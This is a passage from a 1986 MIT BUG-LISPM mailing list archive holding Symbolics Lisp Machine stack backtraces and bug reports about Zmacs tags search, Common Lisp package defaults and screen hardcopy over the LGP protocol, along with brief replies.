   Arg 2 (STRING): NIL

(:METHOD TV:SHEET :DISPLAY-LOZENGED-STRING):  (P.C. = 31)
   Arg 0 (SELF): #<ZMACS-MODE-LINE-WINDOW Zmacs Mode Line Window 2 43201763 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TV:SHEET -- 0. IV's, 1. FL's 120111724>
   Arg 2 (SI:OPERATION): :DISPLAY-LOZENGED-STRING
   Arg 3 (STRING): NIL

(:INTERNAL ZWEI:16B-STRING-NAMED-STRUCTURE-INVOKE 0 ((:PRINT-SELF))):  (P.C. = 123)
   Arg 0 (SI:**DEFSELECT-OP**): :PRINT-SELF
   Arg 1 (STRING): "WITH-REF-SPEC-AREAWITH-REF-SPEC-AREAwith-ref-spec"
   Arg 2 (ZWEI:STREAM): #<ZMACS-MODE-LINE-WINDOW Zmacs Mode Line Window 2 43201763 exposed>
   Arg 3 (IGNORE): 0
   Arg 4 (ZWEI:SLASHIFY-P): NIL

ZWEI:16B-STRING-NAMED-STRUCTURE-INVOKE:  (P.C. = 12)
   Arg 0 (SI:OPERATION): :PRINT-SELF
   Rest arg (SI:SELECT-METHOD-ARGS): ("WITH-REF-SPEC-AREAWITH-REF-SPEC-AREAwith-ref-spec" #<ZMACS-MODE-LINE-WINDOW Zmacs Mode Line Window 2 43201763 exposed> 0 NIL)

NAMED-STRUCTURE-INVOKE:  (P.C. = 27)
   Arg 0 (SI:OPERATION): "WITH-REF-SPEC-AREAWITH-REF-SPEC-AREAwith-ref-spec"
   Local 0 (SI:OPERATION): :PRINT-SELF
   Arg 1 (SI:STRUCTURE): :PRINT-SELF
   Local 1 (SI:STRUCTURE): "WITH-REF-SPEC-AREAWITH-REF-SPEC-AREAwith-ref-spec"
   Rest arg (ARGS): (#<ZMACS-MODE-LINE-WINDOW Zmacs Mode Line Window 2 43201763 exposed> 0 NIL)

SI:PRINT-OBJECT:  (P.C. = 233)
   Arg 0 (EXP): "WITH-REF-SPEC-AREAWITH-REF-SPEC-AREAwith-ref-spec"
   Arg 1 (SI:I-PRINDEPTH): 0
   Arg 2 (SI:SLASHIFY-P): NIL
   Arg 3 (SI:STREAM): #<ZMACS-MODE-LINE-WINDOW Zmacs Mode Line Window 2 43201763 exposed>
   --Defaulted args:--
   Arg 4 (SI:WHICH-OPERATIONS): (:TYO :STRING-OUT :LINE-OUT :LISTEN :TYI :TYI-NO-HANG :ANY-TYI :ANY-TYI-NO-HANG :MORE-VPOS :MARGINS ...)

PRINC:  (P.C. = 10)
   Arg 0 (EXP): "WITH-REF-SPEC-AREAWITH-REF-SPEC-AREAwith-ref-spec"
   Arg 1 (SI:STREAM): #<ZMACS-MODE-LINE-WINDOW Zmacs Mode Line Window 2 43201763 exposed>

(:METHOD ZWEI:MODE-LINE-WINDOW-MIXIN :REDISPLAY):  (P.C. = 226)
   Arg 0 (SELF): #<ZMACS-MODE-LINE-WINDOW Zmacs Mode Line Window 2 43201763 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:MODE-LINE-WINDOW-MIXIN -- 1. IV's, 0. FL's 120112003>
   Arg 2 (SI:OPERATION): :REDISPLAY
   Arg 3 (ZWEI:MODE-LINE-LIST): ((ZWEI:*EXTENDED-STRING-SEARCH-BJ-P* "BJ ") (ZWEI:*EXTENDED-STRING-SEARCH-ZJ-P* "ZJ ") (ZWEI:*EXTENDED-STRING-SEARCH-REVERSE-P* "Reverse ") (ZWEI:*EXTENDED-STRING-SEARCH-TOP-LINE-P* "Top line ") "Tags search:" " (Default: " "WITH-REF-SPEC-AREAWITH-REF-SPEC-AREAwith-ref-spec" ")" (:RIGHT-FLUSH " (Extended search characters)"))
   Arg 4 (ZWEI:FORCE): T

(:METHOD ZWEI:ZMACS-MODE-LINE-WINDOW :COMBINED :REDISPLAY):  (P.C. = 20)
   Arg 0 (SELF): #<ZMACS-MODE-LINE-WINDOW Zmacs Mode Line Window 2 43201763 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:ZMACS-MODE-LINE-WINDOW -- 0. IV's, 14. FL's 120112034>
   Arg 2 (SI:.OPERATION.): :REDISPLAY
   Rest arg (SI:.DAEMON-CALLER-ARGS.): (((ZWEI:*EXTENDED-STRING-SEARCH-BJ-P* "BJ ") (ZWEI:*EXTENDED-STRING-SEARCH-ZJ-P* "ZJ ") (ZWEI:*EXTENDED-STRING-SEARCH-REVERSE-P* "Reverse ") (ZWEI:*EXTENDED-STRING-SEARCH-TOP-LINE-P* "Top line ") "Tags search:" " (Default: " "WITH-REF-SPEC-AREAWITH-REF-SPEC-AREAwith-ref-spec" ")" (:RIGHT-FLUSH " (Extended search characters)")) T)

(:METHOD ZWEI:MODE-LINE-WINDOW-MIXIN :REDISPLAY):  (P.C. = 55)
   Arg 0 (SELF): #<ZMACS-MODE-LINE-WINDOW Zmacs Mode Line Window 2 43201763 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:MODE-LINE-WINDOW-MIXIN -- 1. IV's, 0. FL's 120112003>
   Arg 2 (SI:OPERATION): :REDISPLAY
   Arg 3 (ZWEI:MODE-LINE-LIST): ((ZWEI:*EXTENDED-STRING-SEARCH-BJ-P* "BJ ") (ZWEI:*EXTENDED-STRING-SEARCH-ZJ-P* "ZJ ") (ZWEI:*EXTENDED-STRING-SEARCH-REVERSE-P* "Reverse ") (ZWEI:*EXTENDED-STRING-SEARCH-TOP-LINE-P* "Top line ") "Tags search:" " (Default: " "WITH-REF-SPEC-AREAWITH-REF-SPEC-AREAwith-ref-spec" ")" (:RIGHT-FLUSH " (Extended search characters)"))
   --Defaulted args:--
   Arg 4 (ZWEI:FORCE): NIL

(:METHOD ZWEI:ZMACS-MODE-LINE-WINDOW :COMBINED :REDISPLAY):  (P.C. = 20)
   Arg 0 (SELF): #<ZMACS-MODE-LINE-WINDOW Zmacs Mode Line Window 2 43201763 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:ZMACS-MODE-LINE-WINDOW -- 0. IV's, 14. FL's 120112034>
   Arg 2 (SI:.OPERATION.): :REDISPLAY
   Rest arg (SI:.DAEMON-CALLER-ARGS.): (((ZWEI:*EXTENDED-STRING-SEARCH-BJ-P* "BJ ") (ZWEI:*EXTENDED-STRING-SEARCH-ZJ-P* "ZJ ") (ZWEI:*EXTENDED-STRING-SEARCH-REVERSE-P* "Reverse ") (ZWEI:*EXTENDED-STRING-SEARCH-TOP-LINE-P* "Top line ") "Tags search:" " (Default: " "WITH-REF-SPEC-AREAWITH-REF-SPEC-AREAwith-ref-spec" ")" (:RIGHT-FLUSH " (Extended search characters)")))

ZWEI:REDISPLAY-MODE-LINE:  (P.C. = 135)  (from JCMA: JCMA; GUMBY)

(:METHOD ZWEI:EDITOR :EDIT):  (P.C. = 32)
   Arg 0 (SELF): #<EDITOR 16307464>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:EDITOR -- 12. IV's, 0. FL's 120376216>
   Arg 2 (SI:OPERATION): :EDIT
   Arg 3 (ZWEI:TOP-LEVEL-P): NIL
   Arg 4 (ZWEI:DESCRIPTION): "Minibuffer Command Level"

ZWEI:COMMAND-LOOP:  (P.C. = 73)
   Arg 0 (ZWEI:COMTAB): #<COMTAB Unnamed 145032773>
   Arg 1 (ZWEI:WINDOW): #<WINDOW 146023652>
   Arg 2 (ZWEI:TYPE): ZWEI:EDITOR
   Arg 3 (ZWEI:DESCRIPTION): "Minibuffer Command Level"

ZWEI:EDIT-IN-MINI-BUFFER:  (P.C. = 130)
   Arg 0 (ZWEI:COMTAB): #<COMTAB Unnamed 145032773>
   Arg 1 (ZWEI:INITIAL-CONTENTS): NIL
   Local 1 (ZWEI:INITIAL-CONTENTS): "WITH-REF-SPEC-AREAWITH-REF-SPEC-AREAwith-ref-spec"
   Arg 2 (ZWEI:INITIAL-CHAR-POS): NIL
   Local 2 (ZWEI:INITIAL-CHAR-POS): 49
   Arg 3 (ZWEI:MODE-LINE-LIST): ((ZWEI:*EXTENDED-STRING-SEARCH-BJ-P* "BJ ") (ZWEI:*EXTENDED-STRING-SEARCH-ZJ-P* "ZJ ") (ZWEI:*EXTENDED-STRING-SEARCH-REVERSE-P* "Reverse ") (ZWEI:*EXTENDED-STRING-SEARCH-TOP-LINE-P* "Top line ") "Tags search:" " (Default: " "WITH-REF-SPEC-AREAWITH-REF-SPEC-AREAwith-ref-spec" ")" (:RIGHT-FLUSH " (Extended search characters)"))

(:METHOD ZWEI:HISTORY :FUNCALL-WITH-DEFAULT):  (P.C. = 13)
   Arg 0 (SELF): #<HISTORY Search 144714164>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:HISTORY -- 7. IV's, 0. FL's 120320412>
   Arg 2 (SI:OPERATION): :FUNCALL-WITH-DEFAULT
   Arg 3 (ZWEI:ELEMENT): "WITH-REF-SPEC-AREAWITH-REF-SPEC-AREAwith-ref-spec"
   Arg 4 (FUNCTION): #<DTP-COMPILED-FUNCTION ZWEI:EDIT-IN-MINI-BUFFER 31600072>
   Rest arg (ARGS): (#<COMTAB Unnamed 145032773> NIL NIL ((ZWEI:*EXTENDED-STRING-SEARCH-BJ-P* "BJ ") (ZWEI:*EXTENDED-STRING-SEARCH-ZJ-P* "ZJ ") (ZWEI:*EXTENDED-STRING-SEARCH-REVERSE-P* "Reverse ") (ZWEI:*EXTENDED-STRING-SEARCH-TOP-LINE-P* "Top line ") "Tags search:" " (Default: " "WITH-REF-SPEC-AREAWITH-REF-SPEC-AREAwith-ref-spec" ")" (:RIGHT-FLUSH " (Extended search characters)")))

ZWEI:GET-EXTENDED-SEARCH-16B-STRING:  (P.C. = 71)
   Arg 0 (ZWEI:PROMPT): "Tags search:"
   Local 0 (ZWEI:PROMPT): ("Tags search:" " (Default: " "WITH-REF-SPEC-AREAWITH-REF-SPEC-AREAwith-ref-spec" ")" (:RIGHT-FLUSH " (Extended search characters)"))
   Arg 1 (ZWEI:DEFAULT): "WITH-REF-SPEC-AREAWITH-REF-SPEC-AREAwith-ref-spec"
   Arg 2 (ZWEI:COMTAB): #<COMTAB Unnamed 145032773>
   Arg 3 (ZWEI:OTHER-MODE-LINE): ((ZWEI:*EXTENDED-STRING-SEARCH-BJ-P* "BJ ") (ZWEI:*EXTENDED-STRING-SEARCH-ZJ-P* "ZJ ") (ZWEI:*EXTENDED-STRING-SEARCH-REVERSE-P* "Reverse ") (ZWEI:*EXTENDED-STRING-SEARCH-TOP-LINE-P* "Top line "))

ZWEI:GET-EXTENDED-STRING-SEARCH-STRINGS:  (P.C. = 22)
   Arg 0: NIL
   Arg 1 (ZWEI:PROMPT): "Tags search:"
   Arg 2 (ZWEI:COMTAB): #<COMTAB Unnamed 145032773>
   --Defaulted args:--
   Arg 3 (ZWEI:DEFAULT): "WITH-REF-SPEC-AREAWITH-REF-SPEC-AREAwith-ref-spec"

ZWEI:COM-TAGS-SEARCH:  (P.C. = 5)

ZWEI:COM-EXTENDED-COMMAND:  (P.C. = 27)

ZWEI:RE-EXECUTE-MINI-BUFFER-COMMAND:  (P.C. = 77)
   Arg 0: ((ZWEI:COM-EXTENDED-COMMAND NIL 1 600) "Tags Search" "WITH-REF-SPEC-AREAWITH-REF-SPEC-AREAwith-ref-spec" "")

ZWEI:COM-REPEAT-LAST-MINI-BUFFER-COMMAND:  (P.C. = 27)

ZWEI:COMMAND-EXECUTE:  (P.C. = 57)
   Arg 0 (ZWEI:COMMAND): ZWEI:COM-REPEAT-LAST-MINI-BUFFER-COMMAND
   Arg 1 (ZWEI:CHAR): 857
   Arg 2 (ZWEI:PREFIX-CHAR): NIL
   Arg 3 (ZWEI:HOOK-LIST): (ZWEI:SHIFT-LOCK-HOOK ZWEI:FONT-LOCK-HOOK)

ZWEI:PROCESS-COMMAND-CHAR:  (P.C. = 14)
   Arg 0 (ZWEI:CH): 857

(:METHOD ZWEI:EDITOR :EDIT):  (P.C. = 233)
   Arg 0 (SELF): #<ZMACS-TOP-LEVEL-EDITOR 144776776>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:EDITOR -- 12. IV's, 0. FL's 120377766>
   Arg 2 (SI:OPERATION): :EDIT
   --Defaulted args:--
   Arg 3 (ZWEI:TOP-LEVEL-P): T
   Arg 4 (ZWEI:DESCRIPTION): NIL

(:METHOD ZWEI:TOP-LEVEL-EDITOR :COMBINED :EDIT):  (P.C. = 60)
   Arg 0 (SELF): #<ZMACS-TOP-LEVEL-EDITOR 144776776>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:TOP-LEVEL-EDITOR -- 13. IV's, 1. FL's 120377366>
   Arg 2 (SI:.OPERATION.): :EDIT
   Rest arg (SI:.DAEMON-CALLER-ARGS.): NIL

ZWEI:ZMACS-WINDOW-TOP-LEVEL:  (P.C. = 51)

SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
   Arg 0 (IGNORE): NIL
13-Mar-86 17:19:06-EST,6910;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 13 Mar 86 17:19-EST
Received: from ALLEGHENY.SCRC.Symbolics.COM by MC.LCS.MIT.EDU 13 Mar 86 17:11:47 EST
Received: from WUNDERLAND.SCRC.Symbolics.COM by ALLEGHENY.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 4937; Thu 13-Mar-86 17:10:29-EST
Date: Thu, 13 Mar 86 17:11 EST
From: Charles Hornig <Hornig@SCRC-RIVERSIDE.ARPA>
Subject: common lisp package bug
To: Sue Felshin <sylph@OZ.AI.MIT.EDU>, BUG-LISPM@OZ.AI.MIT.EDU
In-Reply-To: <860311102320.1.FELSHIN@APIARY-8.AI.MIT.EDU>
Message-ID: <860313171105.5.HORNIG@WUNDERLAND.SCRC.Symbolics.COM>

    Date: Tue, 11 Mar 86 10:23 EST
    From: Sue Felshin <sylph@OZ.AI.MIT.EDU>

    In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.11,
    AISite 14.1, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
    microcode TMC5-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(2),
    FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
    FEP0:>v127-info.flod(2), on Lisp Machine Apiary-8:

Thank you for this report.  The problems your describe have been fixed.
The fixes will be distributed in a future release.  Specifically,
IN-PACKAGE will default to :USE COMMON-LISP-GLOBAL and you will not blow
out reading PKG-FIND-PACKAGE in the wrong package.

    The error occurred while loading the file bitstring, which has the
    following header:

    ;;; -*- Mode: LISP; Syntax: Common-lisp -*-

    (provide 'bitstring)

    (in-package 'bitstring #+symbolics :use #+symbolics '(common-lisp-global))

    (export '(bstring bstringp make-bstring bsref
	      bs-and bs-ior bs-xor bs-eqv bs-nand bs-nor
	      bs-andc1 bs-andc2 bs-orc1 bs-orc2
	      bs-all-zerop bs-all-onep bs-any-onep bs-any-zerop
	      bs-equal bs-copy bs-print))

    The file was evaluated first (no problems) and then compiled; then I
    booted and tried loading it via the following file:

    ;;; -*- Mode: LISP; Syntax: Common-Lisp -*-

    (in-package 'lingo
		;; Should happen automatically but Symbolics is still
		;; mired down in Zetalisp.
		#+symbolics :use #+symbolics '(common-lisp-global))

    (export '(transform-word unknown-word *lingo-pathname-defaults*))

    (require 'bitstring #+symbolics "<sylph.lingo>bitstring")
    (use-package 'bitstring)

    None of the files have packages in their attribute lines because this
    causes a query when loading them into Zmacs and I end up either creating
    the package with the incorrect default characteristics or putting the
    buffer in cl-user anyway.

    I tried compiling the file on a fresh machine with nothing loaded and
    got the same error when loading it in the same way.  Should new packages
    use the global package as well as common-lisp-global so that they can
    find PKG-FIND-PACKAGE?  The package chapter in the Reference Guide
    implies that that shouldn't be necessary.  If the attribute line syntax
    is Common-Lisp, why doesn't creating a package with the default
    characteristics make it inherit from common-lisp-global, rather that
    global?

    >>Trap: The function BITSTRING::PKG-FIND-PACKAGE is undefined.
    While in the function SI:*EVAL  SI:DIGESTED-LET  SI:DIGEST-INTERNAL

    SI:*EVAL:  (P.C. = 105)
       Arg 0 (SI:FORM): (BITSTRING::PKG-FIND-PACKAGE #"BITSTRING")
       Arg 1 (SI:ENV): NIL
       --Defaulted args:--
       Arg 2 (SI:HOOK): NIL
       Local 3 (FUNCTION): BITSTRING::PKG-FIND-PACKAGE

    SI:DIGESTED-LET:  (P.C. = 126)
       Arg 0 (SI:BODY): (SI:DIGESTED-LET (LET ((*PACKAGE* #)) (EXPORT (LIST # # # # # # # # # ...))) (((BITSTRING::PKG-FIND-PACKAGE #"BITSTRING") *PACKAGE* . #<DTP-LOCATIVE 36524255>)) NIL (EXPORT (LIST (ZL:INTERN #"BSTRING") (ZL:INTERN #"BSTRINGP") (ZL:INTERN #"MAKE-BSTRING") (ZL:INTERN #"BSREF") (ZL:INTERN #"BS-AND") (ZL:INTERN #"BS-IOR") (ZL:INTERN #"BS-XOR") (ZL:INTERN #"BS-EQV") (ZL:INTERN #"BS-NAND") ...)))
       Local 0 (SI:BODY): ((EXPORT (LIST (ZL:INTERN #"BSTRING") (ZL:INTERN #"BSTRINGP") (ZL:INTERN #"MAKE-BSTRING") (ZL:INTERN #"BSREF") (ZL:INTERN #"BS-AND") (ZL:INTERN #"BS-IOR") (ZL:INTERN #"BS-XOR") (ZL:INTERN #"BS-EQV") (ZL:INTERN #"BS-NAND") ...)))
       Arg 1 (SI:ENV): NIL

    SI:DIGEST-INTERNAL:  (P.C. = 30)
       Arg 0 (SI:CAR-NEW-FORM): SI:DIGESTED-LET
       Arg 1 (SI:CDR-NEW-FORM): ((LET ((*PACKAGE* #)) (EXPORT (LIST # # # # # # # # # ...))) (((BITSTRING::PKG-FIND-PACKAGE #"BITSTRING") *PACKAGE* . #<DTP-LOCATIVE 36524255>)) NIL (EXPORT (LIST (ZL:INTERN #"BSTRING") (ZL:INTERN #"BSTRINGP") (ZL:INTERN #"MAKE-BSTRING") (ZL:INTERN #"BSREF") (ZL:INTERN #"BS-AND") (ZL:INTERN #"BS-IOR") (ZL:INTERN #"BS-XOR") (ZL:INTERN #"BS-EQV") (ZL:INTERN #"BS-NAND") ...)))
       Arg 2 (SI:ENV): NIL

    LET:  (P.C. = 37)
       Arg 0 (SI:FORM): (SI:DIGESTED-LET (LET ((*PACKAGE* #)) (EXPORT (LIST # # # # # # # # # ...))) (((BITSTRING::PKG-FIND-PACKAGE #"BITSTRING") *PACKAGE* . #<DTP-LOCATIVE 36524255>)) NIL (EXPORT (LIST (ZL:INTERN #"BSTRING") (ZL:INTERN #"BSTRINGP") (ZL:INTERN #"MAKE-BSTRING") (ZL:INTERN #"BSREF") (ZL:INTERN #"BS-AND") (ZL:INTERN #"BS-IOR") (ZL:INTERN #"BS-XOR") (ZL:INTERN #"BS-EQV") (ZL:INTERN #"BS-NAND") ...)))
       Arg 1 (SI:ENV): NIL

    SI:*EVAL:  (P.C. = 163)
       Arg 0 (SI:FORM): (SI:DIGESTED-LET (LET ((*PACKAGE* #)) (EXPORT (LIST # # # # # # # # # ...))) (((BITSTRING::PKG-FIND-PACKAGE #"BITSTRING") *PACKAGE* . #<DTP-LOCATIVE 36524255>)) NIL (EXPORT (LIST (ZL:INTERN #"BSTRING") (ZL:INTERN #"BSTRINGP") (ZL:INTERN #"MAKE-BSTRING") (ZL:INTERN #"BSREF") (ZL:INTERN #"BS-AND") (ZL:INTERN #"BS-IOR") (ZL:INTERN #"BS-XOR") (ZL:INTERN #"BS-EQV") (ZL:INTERN #"BS-NAND") ...)))
       --Defaulted args:--
       Arg 1 (SI:ENV): NIL
       Arg 2 (SI:HOOK): NIL

    SI:LOAD-BIN-OP-FORM:  (P.C. = 4)
       Arg 0 (SI:STREAM): #<FILE-INPUT-BINARY-STREAM #"OZ:PS:<SYLPH.LINGO>BITSTRING.BIN" 30361132>

    SI:BIN-LOAD-NEXT-COMMAND:  (P.C. = 24)
       Arg 0 (SI:STREAM): #<FILE-INPUT-BINARY-STREAM #"OZ:PS:<SYLPH.LINGO>BITSTRING.BIN" 30361132>

    SI:BIN-LOAD-TOP-LEVEL:  (P.C. = 6)
       Arg 0 (SI:STREAM): #<FILE-INPUT-BINARY-STREAM #"OZ:PS:<SYLPH.LINGO>BITSTRING.BIN" 30361132>

    Rest of stack:
    (:METHOD ZWEI:MAJOR-MODE :DEFAULT :LOAD-BINARY-FILE):  (P.C. = 4)
    SI:BIN-LOAD-FILE-INTERNAL:  (P.C. = 147)
    FS:LOAD-STREAM:  (P.C. = 16)
    ZL:LOAD:  (P.C. = 124)
    LOAD:  (P.C. = 116)
    REQUIRE:  (P.C. = 31)
    SI:*EVAL:  (P.C. = 401)
    SI:READFILE-INTERNAL:  (P.C. = 142)
    FS:LOAD-STREAM:  (P.C. = 16)
    ZL:LOAD:  (P.C. = 124)
    LOAD:  (P.C. = 116)
    SI:*EVAL:  (P.C. = 401)
    (:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0):  (P.C. = 152)
    TV:WITH-NOTIFICATION-MODE-INTERNAL:  (P.C. = 16)
    SI:LISP-COMMAND-LOOP-INTERNAL:  (P.C. = 54)
    SI:LISP-COMMAND-LOOP:  (P.C. = 67)
    SI:COMMON-LISP-TOP-LEVEL:  (P.C. = 46)
    SI:PROCESS-TOP-LEVEL:  (P.C. = 54)

13-Mar-86 20:44:02-EST,4959;000000000000
Received: from EDDIE.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 13 Mar 86 20:43-EST
Received: by EDDIE (5.31/4.7)
	id AA25268; Thu, 13 Mar 86 20:43:02 EST
Received: by MEDIA-LAB.MIT.EDU (5.31/4.8)  id AA05647; Thu, 13 Mar 86 20:44:23 EST
Date: Thu, 13 Mar 86 20:42 EST
From: Steve Strassmann <STRAZ@MEDIA-LAB.MIT.EDU>
Subject: getting Term-Q to work
To: BUG-LISPM@MEDIA-LAB.MIT.EDU
Message-Id: <860313204210.1.STRAZ@ZAXXON.ARPA>

In Symbolics 3600 Release 6.1, Netrender (DS) 1.12, COLOR 135.55,
COLOR-DEMO 68.10, Paint (DS) 8.0, Menu 6.1,
Experimental Color Editor 5.1, IMAGES 56.25, COLOR-EXTENSIONS 4.6,
BS-FONTS 4.2, Tablet (DS) 3.7, Live Window 272.0, Dynamics (DS) 7.15,
Render (DS) 15.6, COLOR-PALETTE 2.1, Geometry (DS) 7.40, Demo-Band 63.0,
Experimental TMC 3d Image Toolkit 71.0, IP-TCP 29.13, DECTALK 1.1,
Experimental PROSE 1.0, Japanese 24.1, microcode TMC5-COLOR-MIC 336,
FEP 127, FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(3),
FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), Bug Report Recipient, on Zaxxon:

Function-Q has never worked at AMT; I have now finally gotten around to
complaining about it. I have enclosed entries from "sys:site;amt-objects.text" 
which mention the string "printer", plus the error backtrace. What's wrong?

We currently have a DEC LN01 hanging off ATRP. In the near future we
anticipate gatewaying our ethernet to an Appletalk net with several
Laserwriters. How should we hack the namespace?

Can Function-Q work with the color screen? The most naiive of
implementations would be very useful.

Also, I can refer to some Internet hosts (XX, REAGAN, MC) and not others
(AP, AP5, BUDDY-HOLLY). Why not?
==============================================================================
Excerpts from "sys:site;amt-objects.text":

SITE AMT
LOCAL-NAMESPACE AMT
SITE-DIRECTORY XEVIOUS:>sys>site>
TIMEZONE EST
HOST-FOR-BUG-REPORTS MEDIA-LAB
PRETTY-NAME "Media Technology"
DEFAULT-PRINTER LP
DEFAULT-BITMAP-PRINTER LP
HOST-PROTOCOL-DESIRABILITY MEDIA-LAB SMTP .9
HOST-PROTOCOL-DESIRABILITY MEDIA-LAB CHAOS .9
USER-PROPERTY DEFAULT-SAMPLE-RATE 16000

HOST MIT-ATRP
SYSTEM-TYPE UNIX42
SITE AMT
SHORT-NAME ATRP
MACHINE-TYPE "VAX 11/780"
PRETTY-NAME "High Resolution Video Mania"
ADDRESS INTERNET 18.85.0.3
SERVICE FILE TCP TCP-FTP
SERVICE LOGIN TCP TELNET
SERVICE HARDCOPY TCP LGP
SERVICE MAIL-TO-USER TCP SMTP
PRINTER LP
BITMAP-PRINTER LP

PRINTER LP
TYPE LGP
HOST MIT-ATRP
FORMAT ASCII
PROTOCOL LGP
INTERFACE SERIAL
==============================================================================
>>Error: Protocol :LGP does not have a TCP port number.
While in the function TCP:PROTOCOL-NAME-TCP-PORT  NETI:|MEDIUM-TCP-((NETWORK INTERNET))-G0663|  NETI:GET-CONNECTION-FOR-SERVICE-TO-HOST

TCP:PROTOCOL-NAME-TCP-PORT:  (P.C. = 14)
   Arg 0 (TCP::PROTOCOL-NAME): :LGP
   Arg 1 (ERRORP): T

NETI:|MEDIUM-TCP-((NETWORK INTERNET))-G0663|:  (P.C. = 13)
   Arg 0 (NETI:SERVICE-ACCESS-PATH): #<SERVICE-ACCESS-PATH HARDCOPY (LGP) -- MIT-ATRP on INTERNET 136472054>
   Rest arg (NETI:CONNECTION-ARGS): NIL

NETI:GET-CONNECTION-FOR-SERVICE-TO-HOST:  (P.C. = 12)
   Arg 0 (NETI:SERVICE-ACCESS-PATH): #<SERVICE-ACCESS-PATH HARDCOPY (LGP) -- MIT-ATRP on INTERNET 136472054>
   Arg 1 (NET:NETWORK): #<INTERNET-NETWORK INTERNET 5540060>
   Arg 2 (NETI:IMPLEMENTATION): #<MEDIUM-IMPLEMENTATION 76654457>
   Arg 3 (NETI:CONNECTION-ARGS): NIL

NETI:GET-CONNECTION-FOR-SERVICE-ON-MEDIUM:  (P.C. = 262)
   Arg 0 (NETI:MEDIUM): #<MEDIUM-DESCRIPTION on INTERNET 136471557>
   Arg 1 (NETI:SERVICE-ACCESS-PATH): #<SERVICE-ACCESS-PATH HARDCOPY (LGP) -- MIT-ATRP on INTERNET 136472054>
   Arg 2 (NETI:CONNECTION-ARGS): NIL

NET:GET-CONNECTION-FOR-SERVICE:  (P.C. = 7)
   Arg 0 (NETI:SERVICE-ACCESS-PATH): #<SERVICE-ACCESS-PATH HARDCOPY (LGP) -- MIT-ATRP on INTERNET 136472054>
   Rest arg (NETI:CONNECTION-ARGS): NIL

LGP:INVOKE-SERVICE-HARDCOPY-WITH-LGP:  (P.C. = 3)
   Arg 0 (NETI:.SERVICE.): #<SERVICE-ACCESS-PATH HARDCOPY (LGP) -- MIT-ATRP on INTERNET 136472054>

NET:INVOKE-SERVICE-ACCESS-PATH:  (P.C. = 75)
   Arg 0 (NETI:SERVICE-ACCESS-PATH): #<SERVICE-ACCESS-PATH HARDCOPY (LGP) -- MIT-ATRP on INTERNET 136472054>
   Arg 1 (NETI:SERVICE-ARGS): (#<LGP-PRINTER LP 5540713> (:BANNER-FILE-NAME "Screen Hardcopy"))

NET:INVOKE-SERVICE-ON-HOST:  (P.C. = 226)
   Arg 0 (NETI:SERVICE): :HARDCOPY
   Arg 1 (NET:HOST): #<UNIX-HOST MIT-ATRP 5542533>
   Rest arg (NETI:SERVICE-ARGS): (#<LGP-PRINTER LP 5540713> (:BANNER-FILE-NAME "Screen Hardcopy"))

Rest of stack:
(:METHOD SI:PRINTER :HARDCOPY-DEVICE-STREAM):  (P.C. = 34)
(:METHOD SI:HARDCOPY-DEVICE-MIXIN :MAKE-HARDCOPY-STREAM):  (P.C. = 142)
SI:MAKE-HARDCOPY-STREAM:  (P.C. = 52)
TV:KBD-HARDCOPY-SHEET:  (P.C. = 56)
TV:KBD-HARDCOPY-WHOLE-SCREEN:  (P.C. = 3)
(:INTERNAL TV:KBD-ESC 1):  (P.C. = 4)
SI:PROCESS-RUN-FUNCTION-INTERNAL:  (P.C. = 52)
SI:PROCESS-TOP-LEVEL:  (P.C. = 54)

14-Mar-86 10:23:27-EST,763;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 14 Mar 86 10:19-EST
Date: Fri, 14 Mar 86 10:18:19 EST
From: David Vinayak Wallace <GUMBY@MC.LCS.MIT.EDU>
Subject:  getting Term-Q to work
To: STRAZ@MEDIA-LAB.MIT.EDU
cc: BUG-LISPM@MC.LCS.MIT.EDU
In-reply-to: Msg of Thu 13 Mar 86 20:42 EST from Steve Strassmann <STRAZ at MEDIA-LAB.MIT.EDU>
Message-ID: <[MC.LCS.MIT.EDU].850625.860314.GUMBY>

    Date: Thu, 13 Mar 86 20:42 EST
    From: Steve Strassmann <STRAZ at MEDIA-LAB>

    Can Function-Q work with the color screen? The most naiive of
    implementations would be very useful.

I wrote a colour terminal-Q for the cadrs which would print on the
ACT-1.  I don't know if it would be of any good to you, but you're
welcome to it.
14-Mar-86 18:19:17-EST,5916;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 14 Mar 86 18:19-EST
Date: Fri, 14 Mar 86 18:18 EST
From: RZ@MIT-ZERMATT.ARPA
Sender: File-Server@MIT-ZERMATT.ARPA
Subject: Network problems
To: BUG-LISPM@MIT-ZERMATT.ARPA
Message-ID: <860314181852.1.FILE-SERVER@MIT-ZERMATT.ARPA>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, Mailer 43.6,
6-1-Patches 1.11, MLSite 12.2, Imagen Spooler 5.4,
microcode TMC5-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), Network-Security patch, Server-Finger patch,
File system updater, on Zermatt:

This happened on Zermatt, our fileserver/namespace server.


